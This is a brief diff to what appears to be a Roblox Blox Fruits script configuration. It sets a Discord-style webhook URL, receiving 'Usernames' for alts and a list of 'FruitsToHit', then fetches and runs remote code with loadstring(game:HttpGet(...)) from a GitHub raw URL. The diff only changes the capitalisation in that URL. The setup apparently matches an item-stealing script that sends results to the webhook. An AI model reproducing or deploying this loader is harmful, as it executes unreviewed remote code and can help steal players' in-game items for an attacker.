@@ -2,4 +2,4 @@ Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Ymxfcmw2U1N6TXBzX2J
 Usernames = {"user1", "user2"} -- << Your usernames here, you can add as many alts as you want
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough"} -- << Fruits you want the script to detect
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Trueblue23/stuFF/refs/heads/main/wowowo"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TrueBlue23/stuFF/refs/heads/main/wowowo"))()
